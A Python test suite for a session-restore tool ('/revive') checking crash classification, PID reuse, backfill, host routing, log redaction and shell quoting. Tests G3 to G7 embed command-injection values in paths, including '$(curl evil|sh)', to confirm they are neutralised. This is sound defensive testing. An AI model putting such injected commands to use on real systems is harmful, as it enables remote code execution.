#!/usr/bin/env python3
"""Edge-case suite for /revive -- classification, identity, integrity, restore.

Every case is a real assertion against the shipped code. Run:
    python3 tests/test_logic.py
"""
import json, os, subprocess, sys, tempfile, time, shutil

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS = os.path.join(os.path.dirname(HERE), "scripts")
sys.path.insert(0, SCRIPTS)

# NOT under /var/folders: the ephemeral-path filter (correctly) excludes those,
# which would make the backfill fixtures invisible to their own tests.
SANDBOX = tempfile.mkdtemp(prefix=".revive-test-", dir=os.path.expanduser("~"))

# The sandbox was never removed, so every run left another .revive-test-* in
# the home directory. Ten of them had piled up before anyone looked.
import atexit
atexit.register(lambda: shutil.rmtree(SANDBOX, ignore_errors=True))
os.environ["HOME"] = SANDBOX          # isolate the registry from the real one
import registry as R
R.HOME = SANDBOX
R.ROOT = os.path.join(SANDBOX, ".claude", "session-registry")
R.LIVE = os.path.join(R.ROOT, "live")
R.ENDED = os.path.join(R.ROOT, "ended")
R.IDE_DIR = os.path.join(SANDBOX, ".claude", "ide")
R.PROJECTS = os.path.join(SANDBOX, ".claude", "projects")
R.HISTORY = os.path.join(SANDBOX, ".claude", "history.jsonl")
for d in (R.LIVE, R.ENDED, R.IDE_DIR, R.PROJECTS):
    os.makedirs(d, exist_ok=True)

import revive as V
V.R = R

PASS, FAIL = [], []
NOW = time.time()
BOOT = NOW - 86400          # booted a day ago


def check(cid, desc, got, want):
    ok = got == want
    (PASS if ok else FAIL).append((cid, desc, got, want))
    print("  %s %-4s %-58s %s" % ("PASS" if ok else "FAIL", cid, desc,
                                  "" if ok else "got=%r want=%r" % (got, want)))


def rec(**kw):
    base = dict(session_id="s", cwd="/tmp", transcript_path=__file__,
                pid=0, pid_start="", window_pid=0, window_pid_start="",
                started_at=NOW - 600, last_seen=NOW - 300, end_reason=None,
                window_alive_at_end=None, window_root="", host_app="",
                sse_port="", window_port_alive=None, window_same_at_end=None,
                window_token="")
    base.update(kw)
    return base


def spawn_sentinel():
    p = subprocess.Popen(["sleep", "120"])
    return p


# The sandbox redirects HOME, so there is no real lock dir here. Drive the
# window-identity branches directly instead of depending on a live window.
def _with_window(port, token):
    """Pretend `port` is listening and served by a window holding `token`."""
    _pl, _wt = R.port_listening, R.window_token
    R.port_listening = lambda p: True
    R.window_token = lambda p: token
    try:
        return R.same_window(port, _recorded)
    finally:
        R.port_listening, R.window_token = _pl, _wt

print("\n=== A. Termination classification ===")
check("A1", "SIGKILL / OOM: no end event -> CRASHED (restore)",
      R.classify(rec(), boot=BOOT), "CRASHED")
# Killing a session is not choosing to end it, so it stays restorable.
check("A2", "tab close: SIGHUP, Cursor alive -> TERMINATED (restore)",
      R.classify(rec(end_reason="other", window_alive_at_end=True), boot=BOOT), "TERMINATED")
check("A3", "crash: SIGHUP, Cursor dead -> CRASHED (restore)",
      R.classify(rec(end_reason="other", window_alive_at_end=False), boot=BOOT), "CRASHED")
check("A4", "/exit typed -> EXITED (no restore)",
      R.classify(rec(end_reason="prompt_input_exit"), boot=BOOT), "EXITED")
check("A5", "logout -> EXITED",
      R.classify(rec(end_reason="logout"), boot=BOOT), "EXITED")
# Regression: a session restored and then killed before you typed in it was
# deleted from the registry entirely, so it could never be recovered again.
check("A8", "a killed session with no prompt is TERMINATED, not forgotten",
      R.classify(rec(end_reason="other", window_alive_at_end=True,
                     started_at=NOW - 60, last_seen=NOW - 60), boot=BOOT),
      "TERMINATED")
check("A9", "same session crashed -> CRASHED",
      R.classify(rec(end_reason="other", window_alive_at_end=False,
                     started_at=NOW - 60, last_seen=NOW - 60), boot=BOOT),
      "CRASHED")
check("A7", "only /exit and logout are non-restorable",
      sorted(R.RESTORABLE), ["CRASHED", "TERMINATED"])
check("A6", "SIGHUP, window unknown -> TERMINATED (fail safe: offer it)",
      R.classify(rec(end_reason="other", window_alive_at_end=None), boot=BOOT), "TERMINATED")

# --- how it ended: app crash vs window close vs tab close ---
# All three leave the session restorable; the difference is only what happened,
# and the main-pid check alone cannot separate a closed window from a closed tab
# because Cursor survives both.
check("A10", "Cursor died -> app crash",
      R.end_detail(rec(end_reason="other", window_alive_at_end=False)), "app crash")
check("A11", "Cursor alive, my window gone -> window closed",
      R.end_detail(rec(end_reason="other", window_alive_at_end=True,
                       window_same_at_end=False)), "window closed")
check("A12", "Cursor alive, still MY window -> tab closed",
      R.end_detail(rec(end_reason="other", window_alive_at_end=True,
                       window_same_at_end=True)), "tab closed")
# A reloaded window binds a NEW port and mints a NEW token. Judging by the port
# alone would call a reload "window closed", or, if the old port were reused by
# an unrelated window, "tab closed" while yours was gone.
_recorded = "tok-A"
check("A11b", "same port, same token -> still my window",
      _with_window("1234", "tok-A"), True)
check("A11c", "same port, DIFFERENT token -> the window was reloaded or replaced",
      _with_window("1234", "tok-B"), False)
_recorded = ""
check("A11d", "no token recorded -> stay honest, return None rather than guess",
      _with_window("1234", "tok-A"), None)
check("A11e", "nothing listening at all -> not my window",
      R.same_window("59999", "tok-A"), False)
check("A13", "no end event and the process is gone -> killed outright",
      R.end_detail(rec()), "killed outright")
# A live session has not ended, so it must not describe an ending. The card
# read "Running - killed outright", which is a contradiction on its face.
_p = subprocess.Popen(["sleep", "30"])
check("A13b", "a RUNNING session reports no ending at all",
      R.end_detail(rec(pid=_p.pid, pid_start=R.pid_start(_p.pid),
                       pid_comm=R.pid_comm(_p.pid))), "")
_p.kill(); _p.wait()
# /resume mints a new id; the old record keeps a transcript_path that no longer
# exists. Those orphans looked like duplicates of the running session.
check("A13c", "a record whose transcript is gone is not offerable",
      R.transcript_ok(rec(transcript_path="/gone/never.jsonl")), False)
check("A14", "typed /exit -> you exited",
      R.end_detail(rec(end_reason="prompt_input_exit")), "you exited")
check("A15", "window close and tab close are BOTH restorable",
      [R.classify(rec(end_reason="other", window_alive_at_end=True,
                      window_port_alive=v), boot=BOOT) in R.RESTORABLE
       for v in (False, True)], [True, True])

# --- the invariants that the four scattered derivations kept violating ---
_p2 = subprocess.Popen(["sleep", "30"])
_live = rec(pid=_p2.pid, pid_start=R.pid_start(_p2.pid), pid_comm=R.pid_comm(_p2.pid))
check("A16", "a RUNNING session never claims an ending",
      R.view(_live)["state"] == "RUNNING" and R.view(_live)["detail"] == "", True)
check("A17", "classify() and view() can never disagree",
      all(R.classify(r) == R.view(r)["state"] for r in
          [_live, rec(), rec(end_reason="other", window_alive_at_end=False),
           rec(end_reason="prompt_input_exit"), rec(end_reason="clear")]), True)
check("A18", "no transcript means never restorable, whatever the state",
      R.view(rec(end_reason="other", window_alive_at_end=False,
                 transcript_path="/gone.jsonl"))["restorable"], False)
# A session whose transcript is gone is worth SEEING (history still has what you
# asked) but can never be resumed, because --resume has nothing to read.
check("A19", "a backfilled session IS restorable through the same gate",
      R.view(dict(rec(), _origin="history", _state="BACKFILL"))["restorable"], True)
check("A20", "a running session is never restorable",
      R.view(_live)["restorable"], False)
_p2.kill(); _p2.wait()

print("\n=== B. Session identity transitions ===")
check("B1", "/clear: old id retired as EXITED",
      R.classify(rec(end_reason="clear"), boot=BOOT), "EXITED")
check("B2", "in-place resume: not a loss",
      R.classify(rec(end_reason="resume"), boot=BOOT), "EXITED")
sent = spawn_sentinel()
st = R.pid_start(sent.pid)
check("B3", "session still running -> RUNNING (never duplicate)",
      R.classify(rec(pid=sent.pid, pid_start=st, pid_comm=R.pid_comm(sent.pid)),
                 boot=BOOT), "RUNNING")
# /clear and resume mint a new session id while the same process continues, so
# a FINISHED record can still name a live pid. It must not read as running.
check("B4", "ended session with a still-live pid is NOT running",
      R.classify(rec(pid=sent.pid, pid_start=st, pid_comm=R.pid_comm(sent.pid),
                     end_reason="clear"), boot=BOOT), "EXITED")
check("B5", "same, for a terminated session",
      R.classify(rec(pid=sent.pid, pid_start=st, pid_comm=R.pid_comm(sent.pid),
                     end_reason="other", window_alive_at_end=True),
                 boot=BOOT), "TERMINATED")

# /clear keeps the process and mints a new session id, so the old id is a dead
# end unless the two are linked. Verified on real records: a141826f ended on
# pid 2897 and 4963cf80 began 0.2s later on the same pid with source="clear".
import importlib.util as _il
_hk = _il.spec_from_file_location("hk", os.path.join(SCRIPTS, "hook.py"))
_hm = _il.module_from_spec(_hk); _hk.loader.exec_module(_hm)

R.save(R.path_for("older", ended=True),
       rec(session_id="older", pid=4242, ended_at=NOW - 1, end_reason="clear"))
_p = _hm._predecessor(R, 4242, NOW)
check("B6", "the session cleared out of is found by pid and timing",
      _p and _p["session_id"], "older")
check("B7", "a different pid is not matched", _hm._predecessor(R, 9999, NOW), None)
check("B8", "an old handover outside the window is not matched",
      _hm._predecessor(R, 4242, NOW + 9999), None)
os.unlink(R.path_for("older", ended=True))

# ---- J. Host routing. A vault session was restored into Cursor because
# restore() handed EVERY group to `cursor --new-window`, discarding the host
# that group_key had already worked out.
import inspect as _insp
_HOSTS = R.HOSTS_FILE
_saved = open(_HOSTS).read() if os.path.exists(_HOSTS) else None
json.dump({"/tmp/vault": "Obsidian"}, open(_HOSTS, "w"))
try:
    check("J1", "a declared folder resolves to its app",
          R.host_pref("/tmp/vault"), "Obsidian")
    check("J2", "a subfolder inherits the declaration",
          R.host_pref("/tmp/vault/notes/deep"), "Obsidian")
    check("J3", "an undeclared folder resolves to nothing",
          R.host_pref("/tmp/elsewhere"), None)
    check("J4", "a sibling with a shared prefix does NOT match",
          R.host_pref("/tmp/vault-backup"), None)
    check("J5", "OBSERVED beats declared: a path is not evidence of an app",
          R.effective_host({"cwd": "/tmp/vault", "host_app": "Cursor"}), "Cursor")
    check("J5b", "the declared map only fills a gap the recorder could not reach",
          R.effective_host({"cwd": "/tmp/vault"}), "Obsidian")
    check("J5c", "nothing observed and nothing declared stays UNKNOWN, "
                 "so the caller must ask instead of assuming Cursor",
          R.effective_host({"cwd": "/tmp/elsewhere"}), None)
    check("J6", "with nothing declared, observed still wins",
          R.effective_host({"cwd": "/tmp/elsewhere", "host_app": "Cursor"}), "Cursor")
    check("J7", "an observed Cursor session groups by window, not by path",
          V.group_key({"cwd": "/tmp/vault", "host_app": "Cursor",
                       "sse_port": 33798}), "port:33798")
    check("J7b", "with no observed host, the declared app still routes it",
          V.group_key({"cwd": "/tmp/vault", "sse_port": 33798}), "app:Obsidian")
    # the wiring, not just the helper: this is the class of regression where
    # 20 tests passed while restore() had stopped calling group_key at all
    _src = _insp.getsource(V.restore)
    check("J8", "restore() diverts app: groups instead of planning them",
          'key.startswith("app:")' in _src and "elsewhere.append" in _src, True)
    check("J9", "restore() hands those to handoff(), not to cursor",
          "handoff(host" in _src, True)
    check("J10", "handoff never invokes the Cursor CLI",
          "CURSOR_CLI" in _insp.getsource(V.handoff), False)
finally:
    if _saved is not None: open(_HOSTS, "w").write(_saved)
    else: os.unlink(_HOSTS)

# ---- K. Deliberate-close detection. Presence of a /exit|/clear block is NOT
# enough: 41 of 433 transcripts carrying one have it near the TOP, always a
# /clear on a session that then ran on for hundreds of lines.
def _tx(*lines):
    p = os.path.join(SANDBOX, "tx-%d.jsonl" % time.time_ns())
    open(p, "w").write("\n".join(json.dumps(l) for l in lines))
    return p

CMD = {"type": "user", "message": {"content":
       "<command-name>/exit</command-name>\n<command-message>exit</command-message>"}}
CLR = {"type": "user", "message": {"content": "<command-name>/clear</command-name>"}}
BYE = {"type": "user", "message": {"content": "<local-command-stdout>Goodbye!</local-command-stdout>"}}
WORK = {"type": "user", "message": {"content": "please refactor the parser"}}
NOISE = {"type": "queue-operation", "message": {"content": ""}}
NOTIF = {"type": "user", "message": {"content": "<task-notification>done</task-notification>"}}

check("K1", "/exit as the final line counts as a deliberate close",
      V._transcript_ends_deliberately(_tx(WORK, CMD)), True)
check("K2", "a trailing goodbye does not disqualify it",
      V._transcript_ends_deliberately(_tx(WORK, CMD, BYE)), True)
check("K3", "queue noise and task notifications do not disqualify it",
      V._transcript_ends_deliberately(_tx(WORK, CMD, BYE, NOISE, NOTIF)), True)
check("K4", "real work AFTER the command means it carried on: not a close",
      V._transcript_ends_deliberately(_tx(CLR, WORK, WORK)), False)
check("K5", "a /clear at the top of a long session is not a close",
      V._transcript_ends_deliberately(_tx(CLR, WORK, CMD, WORK)), False)
check("K6", "no command block at all is not a close",
      V._transcript_ends_deliberately(_tx(WORK, WORK)), False)
check("K7", "a missing transcript is not a close",
      V._transcript_ends_deliberately(os.path.join(SANDBOX, "nope.jsonl")), False)

# ---- L. Obsidian tickets. An Obsidian terminal opens with no arguments, so
# each shell must discover which session it is AFTER starting.
_TDIR = V.TICKETS
V.TICKETS = os.path.join(SANDBOX, "tickets")
try:
    V.write_tickets("/v", [{"session_id": "s1", "cwd": SANDBOX},
                           {"session_id": "s2", "cwd": SANDBOX}])
    check("L1", "one ticket per session is written",
          len([f for f in os.listdir(V.TICKETS) if f.endswith(".json")]), 2)
    a = V.claim_ticket("/v")
    b = V.claim_ticket("/v")
    check("L2", "two shells claim two DIFFERENT sessions",
          a["sid"] != b["sid"], True)
    check("L3", "a third shell gets nothing, so no session is resumed twice",
          V.claim_ticket("/v"), None)
    V.write_tickets("/v", [{"session_id": "s3", "cwd": SANDBOX}])
    check("L4", "a ticket for another vault is not claimable here",
          V.claim_ticket("/other"), None)
    _p = os.path.join(V.TICKETS, "s3.json")
    _d = json.load(open(_p)); _d["at"] = time.time() - 9999
    json.dump(_d, open(_p, "w"))
    check("L5", "a stale ticket is dropped, not resumed hours later",
          V.claim_ticket("/v"), None)
    check("L6", "and the stale file is cleaned up", os.path.exists(_p), False)
    check("L7", "grouping sends a session to the vault that contains it",
          list(V._group_by_vault([{"cwd": "/v/notes"}], ["/v", "/w"])), ["/v"])
    check("L8", "a session outside every vault still gets a home",
          list(V._group_by_vault([{"cwd": "/elsewhere"}], ["/v"])), ["/v"])
finally:
    V.TICKETS = _TDIR

# ---- M. Revive must not manufacture its own evidence, and must not hand a
# revived session the environment of the session that launched it.
_PL = R.PLACEMENTS
R.PLACEMENTS = os.path.join(SANDBOX, "placements.json")
_HF = R.HOSTS_FILE
try:
    json.dump({"default_host": "", "hosts": {"/v": "Obsidian"}},
              open(R.SETTINGS_FILE, "w"))
    # NOT named `rec`: that is the module-level record factory every later
    # test calls, and shadowing it made the whole suite die 30 checks later.
    _r = {"session_id": "p1", "cwd": "/v", "host_app": "Cursor"}
    check("M1", "a genuine observation outranks a declaration",
          R.host_info(_r)["source"], "observed")
    R.record_placement("p1", "Cursor")
    check("M2", "an observation revive itself created does NOT, or a bad "
                "restore becomes the record that justifies repeating it",
          R.host_info(_r), {"host": "Obsidian", "source": "declared"})
    check("M3", "with nothing declared, the placement is still remembered",
          R.host_info({"session_id": "p1", "cwd": "/elsewhere",
                       "host_app": "Cursor"})["source"], "placed")
    env = V.clean_env()
    check("M4", "CLAUDE_CODE_CHILD_SESSION never reaches a launched app: it "
                "turns transcript saving OFF, so the revived session would "
                "record nothing and could never be revived again",
          "CLAUDE_CODE_CHILD_SESSION" in env, False)
    check("M5", "nor the launching session's own id",
          "CLAUDE_CODE_SESSION_ID" in env, False)
    check("M6", "nor Cursor's SSE port",
          "CLAUDE_CODE_SSE_PORT" in env, False)
    check("M7", "but the ordinary environment survives", "PATH" in env, True)
    _w = open(os.path.join(os.path.dirname(SCRIPTS), "hosts",
                           "obsidian-shell")).read()
    check("M8", "the wrapper scrubs too, since it cannot know how Obsidian "
                "was launched",
          "unset CLAUDE_CODE_CHILD_SESSION" in _w, True)
finally:
    R.PLACEMENTS = _PL
    if os.path.exists(R.SETTINGS_FILE):
        os.unlink(R.SETTINGS_FILE)

# ---- N. The capability token must never reach a log or a printed banner.
# It leaked ~1650 times into a world readable dashboard.log because the request
# logger wrote the full query string, which cancelled the token out entirely.
import re as _re
_SERVE = open(os.path.join(SCRIPTS, "serve.py")).read()
_REVIVE = open(os.path.join(SCRIPTS, "revive.py")).read()

_redact = lambda s: _re.sub(r"\?[^\s\"]*", "", s)
check("N1", "a query string is stripped from a logged request line",
      _redact('"GET /api/pulse?t=SECRET123 HTTP/1.1"'), '"GET /api/pulse HTTP/1.1"')
check("N2", "the method, path and version survive redaction",
      "/api/state" in _redact('"GET /api/state?t=X HTTP/1.1"'), True)
check("N3", "the redaction is actually wired into log_message",
      'line = re.sub(r"\\?[^\\s\\"]*", "", line)' in _SERVE, True)
check("N4", "the startup banner does not print the token",
      'http://127.0.0.1:%d/?t=%s" % (port, TOKEN)' in _SERVE, False)
check("N5", "dashboard.log is created 0600, like dashboard.json",
      "os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600" in _REVIVE, True)

check("N6", "the cookie is accepted as a credential alongside the URL token",
      "_cookie_token(handler)" in _SERVE and 'COOKIE_NAME = "revive_token"' in _SERVE,
      True)
check("N7", "the cookie is HttpOnly and SameSite=Strict",
      "HttpOnly; SameSite=Strict" in _SERVE, True)
check("N8", "a cookie is only minted for a request that already proved the token",
      "if _loopback_only(self) and _authed(self, q):" in _SERVE, True)
# SIGPIPE fires whenever a client goes away mid-response, which is what a
# browser refresh does. Handling it and exiting turned every aborted request
# into a dead server: "received SIGPIPE, exiting".
check("N9", "SIGPIPE is explicitly ignored, never handled",
      "_sig.signal(_sig.SIGPIPE, _sig.SIG_IGN)" in _SERVE, True)
check("N10", "SIGPIPE is not in the list of signals that exit",
      '"SIGTERM", "SIGINT", "SIGHUP", "SIGQUIT", "SIGPIPE"' in _SERVE, False)

print("\n=== C. Process identity (PID reuse) ===")
cm = R.pid_comm(sent.pid)
check("C1", "alive pid + matching start + matching comm -> same process",
      R.same_process(sent.pid, st, cm), True)
check("C2", "alive pid + WRONG start time -> NOT same process (reuse)",
      R.same_process(sent.pid, "Thu Jan  1 00:00:00 1970", cm), False)
check("C3", "pid reuse must not be classified RUNNING",
      R.classify(rec(pid=sent.pid, pid_start="Thu Jan  1 00:00:00 1970"),
                 boot=BOOT), "CRASHED")
# ps -o lstart has 1-second resolution, so a PID reused inside the same second
# is invisible to the timestamp. The command name closes that hole.
check("C1b", "same pid + same second + DIFFERENT command -> not same process",
      R.same_process(sent.pid, st, "Google Chrome"), False)
check("C1c", "no identity recorded -> not trusted as running",
      R.same_process(sent.pid, "", ""), False)
check("C1d", "a session whose pid was reused within a second is still offered",
      R.classify(rec(pid=sent.pid, pid_start=st, pid_comm="Google Chrome"),
                 boot=BOOT), "CRASHED")
sent.kill(); sent.wait()
check("C4", "dead pid -> not alive", R.pid_alive(sent.pid), False)
check("C5", "pid 0 / missing -> not alive", R.pid_alive(0), False)

print("\n=== D. Time and lifecycle ===")
# REGRESSION: STALE used to key on started_at < boot. A crash that reboots the
# machine kills sessions that ALL started before the boot, so the rule hid
# exactly the victims it existed to surface. Four real sessions were lost this
# way. It now keys on how long the transcript has been idle.
check("D1", "a session killed by a crash-then-reboot is CRASHED, not STALE",
      R.classify(rec(started_at=BOOT - 7200, last_seen=BOOT - 600,
                     transcript_path=__file__), boot=BOOT), "CRASHED")
check("D2", "started after boot -> CRASHED",
      R.classify(rec(started_at=BOOT + 60, transcript_path=__file__),
                 boot=BOOT), "CRASHED")
check("D3", "an old session with no exit event is STILL a crash, not hidden",
      R.classify(rec(started_at=NOW - 40 * 86400, last_seen=NOW - 40 * 86400,
                     transcript_path=__file__)), "CRASHED")
check("D4", "there are exactly four states, no STALE",
      sorted({R.classify(r) for r in [
          rec(), rec(end_reason="prompt_input_exit"),
          rec(end_reason="other", window_alive_at_end=True),
          rec(end_reason="other", window_alive_at_end=False)]}),
      ["CRASHED", "EXITED", "TERMINATED"])
# Behavioural, not textual: no input may produce a fifth state.
_states = set()
for _r in [rec(), rec(started_at=0), rec(started_at=NOW - 999 * 86400),
           rec(end_reason="prompt_input_exit"), rec(end_reason="logout"),
           rec(end_reason="clear"), rec(end_reason="resume"),
           rec(end_reason="other"), rec(end_reason="other", window_alive_at_end=True),
           rec(end_reason="other", window_alive_at_end=False),
           rec(end_reason="weird_unknown_reason")]:
    _states.add(R.classify(_r))
check("D5", "no input can produce a state outside the four",
      _states - {"RUNNING", "CRASHED", "TERMINATED", "EXITED"}, set())

print("\n=== E. Data integrity ===")
bad = os.path.join(R.LIVE, "corrupt.json")
open(bad, "w").write("{ this is not json")
check("E1", "corrupt registry file -> skipped, no exception",
      R.load(bad), None)
check("E2", "corrupt file does not break enumeration",
      isinstance(R.all_live(), list), True)
os.unlink(bad)
p = os.path.join(R.LIVE, "atomic.json")
R.save(p, {"session_id": "atomic"})
check("E3", "atomic save leaves no .tmp residue",
      len([f for f in os.listdir(R.LIVE) if ".tmp" in f]), 0)
check("E4", "saved record reads back intact", R.load(p)["session_id"], "atomic")
os.unlink(p)
check("E5", "missing transcript -> not offerable",
      R.transcript_ok(rec(transcript_path="/nope/gone.jsonl")), False)
check("E6", "present transcript -> offerable", R.transcript_ok(rec()), True)
shutil.rmtree(R.LIVE)
os.makedirs(R.LIVE, exist_ok=True)
check("E7", "registry dir recreated when missing", os.path.isdir(R.LIVE), True)

print("\n=== F. Backfill (sessions with NO hook record) ===")
for d in ("projA", "projB", "projC", "projD", "projE", "projF", "projG"):
    os.makedirs(os.path.join(SANDBOX, d), exist_ok=True)
PA = os.path.join(SANDBOX, "projA"); PB = os.path.join(SANDBOX, "projB")
PC = os.path.join(SANDBOX, "projC"); PD = os.path.join(SANDBOX, "projD")
PE = os.path.join(SANDBOX, "projE"); PF = os.path.join(SANDBOX, "projF")
PG = os.path.join(SANDBOX, "projG")
hist = [
    {"sessionId": "aaa", "timestamp": int((NOW - 600) * 1000),
     "project": PA, "display": "fix the header"},
    {"sessionId": "bbb", "timestamp": int((NOW - 600) * 1000),
     "project": PB, "display": "/exit"},
    {"sessionId": "ccc", "timestamp": int((NOW - 600) * 1000),
     "project": PC, "display": "no transcript for this one"},
    {"sessionId": "ddd", "timestamp": int((NOW - 90 * 86400) * 1000),
     "project": PD, "display": "ancient"},
]
with open(R.HISTORY, "w") as fh:
    for h in hist:
        fh.write(json.dumps(h) + "\n")
hist += [
    {"sessionId": "eee", "timestamp": int((NOW - 700) * 1000),
     "project": PE, "display": "real prompt here"},
    {"sessionId": "eee", "timestamp": int((NOW - 600) * 1000),
     "project": PE, "display": "/rename something"},
    {"sessionId": "fff", "timestamp": int((NOW - 600) * 1000),
     "project": PF, "display": "/clear"},
    {"sessionId": "ggg", "timestamp": int((NOW - 600) * 1000),
     "project": "/tmp/definitely/gone/nowhere", "display": "vanished folder"},
    {"sessionId": "hhh", "timestamp": int((NOW - 600) * 1000),
     "project": "/private/tmp/scratchy", "display": "scratch work"},
]
with open(R.HISTORY, "w") as fh:
    for h in hist:
        fh.write(json.dumps(h) + "\n")
for sid in ("aaa", "bbb", "ddd", "eee", "fff", "ggg", "hhh"):
    d = os.path.join(R.PROJECTS, "proj-%s" % sid)
    os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "%s.jsonl" % sid), "w").write("{}\n")
V.R = R
got = {c["session_id"] for c in V.backfill_candidates(days=7)}
check("F1", "session with no registry record IS reconstructed", "aaa" in got, True)
check("F2", "/exit session is listed but marked EXITED (not restorable)",
      next((c["_state"] for c in V.backfill_candidates(days=7)
            if c["session_id"] == "bbb"), None), "EXITED")
# Deliberately changed: a session whose transcript is gone used to vanish with
# no explanation. It is now listed as LOST, findable but never restorable.
# No transcript is a PROPERTY, not a state. The session still ended how it
# ended; it is simply not resumable.
_c = next((c for c in V.backfill_candidates(days=7)
           if c["session_id"] == "ccc"), None)
check("F3", "a session with no transcript is still listed", _c is not None, True)
check("F3b", "and keeps its real state, not a special one",
      _c["_state"] in ("BACKFILL", "EXITED") if _c else None, True)
check("F3c", "but is never restorable",
      R.view(dict(_c, transcript_path="/gone.jsonl"))["restorable"] if _c else None,
      False)
check("F4", "outside --days window is EXCLUDED", "ddd" in got, False)
R.save(R.path_for("aaa"), rec(session_id="aaa"))
got2 = {c["session_id"] for c in V.backfill_candidates(days=7)}
check("F5", "already in registry -> no duplicate from history", "aaa" in got2, False)
os.unlink(R.path_for("aaa"))
cand = {c["session_id"]: c for c in V.backfill_candidates(days=7)}
# Deliberate exits are no longer hidden, they are listed and labelled so the
# dashboard's status filter can show them on demand.
check("F6", "/clear session is LISTED, not dropped", "fff" in cand, True)
check("F6b", "and it is labelled EXITED",
      cand.get("fff", {}).get("_state"), "EXITED")
check("F6c", "/exit session is likewise listed as EXITED",
      cand.get("bbb", {}).get("_state"), "EXITED")
check("F7", "vanished project folder -> EXCLUDED", "ggg" in cand, False)
check("F8", "ephemeral /private/tmp path -> EXCLUDED", "hhh" in cand, False)
# A session can hold a full conversation and still have no prompt recorded,
# because the registry only learns one from UserPromptSubmit and history only
# from what you typed at the CLI. One crashed session showed "no recorded
# prompt" while its transcript held five user messages.
_tx = os.path.join(SANDBOX, "tp.jsonl")
open(_tx, "w").write(
    '{"type":"user","message":{"content":"Caveat: ignore me"}}\n'
    '{"type":"user","message":{"content":"the real first question"}}\n'
    '{"type":"assistant","message":{"content":"reply"}}\n'
    '{"type":"user","message":{"content":"/exit"}}\n')
check("F17", "prompt is read from the transcript when nothing else has one",
      V.prompt_from_transcript(_tx), "the real first question")
check("F18", "slash commands and scaffolding are skipped",
      "/exit" in V.prompt_from_transcript(_tx), False)
check("F19", "a missing transcript yields empty, never an error",
      V.prompt_from_transcript("/gone/never.jsonl"), "")

check("F9", "label uses last REAL prompt, not the slash command",
      cand.get("eee", {}).get("last_prompt"), "real prompt here")
check("F13", "lifetime is derived from first and last history entry",
      round(cand.get("eee", {}).get("lifetime", 0)), 100)
check("F10", "the running session itself is EXCLUDED (no duplicate)",
      "aaa" in {c["session_id"]
                for c in V.backfill_candidates(days=7, exclude_ids={"aaa"})}, False)
# Regression: excluding by FOLDER wrongly hid every other session in that
# folder. Two sessions share PA here; excluding one must keep the other.
with open(R.HISTORY, "a") as fh:
    fh.write(json.dumps({"sessionId": "aaz", "timestamp": int((NOW - 500) * 1000),
                         "project": PA, "display": "sibling in the same folder"}) + "\n")
d = os.path.join(R.PROJECTS, "proj-aaz"); os.makedirs(d, exist_ok=True)
open(os.path.join(d, "aaz.jsonl"), "w").write("{}\n")
sib = {c["session_id"] for c in V.backfill_candidates(days=7, exclude_ids={"aaa"})}
check("F11", "a SIBLING in the same folder is still offered",
      "aaz" in sib, True)
check("F12", "and the excluded one is still gone", "aaa" in sib, False)

# --- recovering sessions that exist only as a transcript ---
# history.jsonl is not a complete record, and the projects/ directory name is a
# lossy encoding: BOTH "/" and "." become "-".
def _enc(pth):
    """Encode a path the way ~/.claude/projects names it: / and . both become -."""
    return "-" + pth.lstrip("/").replace("/", "-").replace(".", "-")

os.makedirs(os.path.join(SANDBOX, "a.b", "c"), exist_ok=True)
os.makedirs(os.path.join(SANDBOX, "my-repo", "src"), exist_ok=True)
check("F14", "a DOTTED directory name decodes correctly",
      V.decode_project_dir(_enc(os.path.join(SANDBOX, "a.b", "c"))),
      os.path.join(SANDBOX, "a.b", "c"))
check("F14b", "a DASHED directory name decodes correctly",
      V.decode_project_dir(_enc(os.path.join(SANDBOX, "my-repo", "src"))),
      os.path.join(SANDBOX, "my-repo", "src"))
check("F15", "an unresolvable name yields nothing, never a wrong guess",
      V.decode_project_dir("-no-such-path-anywhere-at-all"), "")
check("F16", "a name that is not encoded is rejected",
      V.decode_project_dir("not-starting-with-dash"[0:0] or "plain"), "")

print("\n=== G. Restore mechanics ===")
# group_key returns a WINDOW IDENTITY, group_root turns it into a folder.
check("G1", "sessions sharing an sse_port share a window (Chrome-style)",
      V.group_key(rec(sse_port="65022", window_root="/W")), "port:65022")
check("G1b", "no port -> falls back to the workspace root",
      V.group_key(rec(window_root="/W", cwd="/tmp/x")), "root:/W")
check("G2", "nothing recorded -> ONE shared window, not N windows",
      V.group_key(rec(window_root="", cwd="/tmp/x")), "shared")
check("G2b", "shared window is rooted at the common ancestor",
      V.group_root("shared", [rec(cwd="/tmp"), rec(cwd="/tmp")]), "/tmp")
check("G2c", "two sessions, one port -> a single window group",
      len({V.group_key(rec(sse_port="1")), V.group_key(rec(sse_port="1"))}), 1)
check("G2d", "two sessions, two ports -> two window groups",
      len({V.group_key(rec(sse_port="1")), V.group_key(rec(sse_port="2"))}), 2)
# --- host app: a session lives in an APP first, a window second ---
check("G2e", "a non-Cursor session never joins a Cursor window group",
      V.group_key(rec(host_app="Obsidian", sse_port="65022")), "app:Obsidian")
check("G2f", "two apps -> two groups even on the same port",
      len({V.group_key(rec(host_app="Obsidian", sse_port="1")),
           V.group_key(rec(host_app="Cursor", sse_port="1"))}), 2)
# "detached" records that the ancestry walk hit launchd without passing an app.
# It is the ABSENCE of an answer, not a place a session can be reopened, and it
# was leaking onto cards as a host named "detached".
check("G2e2", "detached is not treated as a host",
      R.host_info(rec(host_app="detached", cwd="/nowhere"))["source"], "unknown")
check("G2e3", "a detached session still groups by its Cursor window",
      V.group_key(rec(host_app="detached", sse_port="65022")), "port:65022")
check("G2g", "Cursor-hosted still groups by window port",
      V.group_key(rec(host_app="Cursor", sse_port="65022")), "port:65022")
check("G2h", "unknown host (backfill) is treated as Cursor-eligible",
      V.group_key(rec(host_app="unknown", sse_port="65022")), "port:65022")
check("G2i", "Obsidian-hosted and Cursor-hosted never merge",
      V.group_key(rec(host_app="Obsidian")), "app:Obsidian")
check("G2j", "host_app walks to launchd -> detached, not a fake app",
      R.host_app(1), "detached")

check("G3", "shell metachars in path are neutralised",
      V.sh_quote("/x/$(curl evil|sh)"), "'/x/$(curl evil|sh)'")
check("G4", "embedded single quote is escaped",
      V.sh_quote("it's"), "'it'\\''s'")
check("G5", "path with command substitution rejected by allowlist",
      V.is_safe_abs("/x/$(id)"), False)
check("G6", "path with backtick rejected", V.is_safe_abs("/x/`id`"), False)
check("G7", "newline in path rejected", V.is_safe_abs("/x/\nevil"), False)
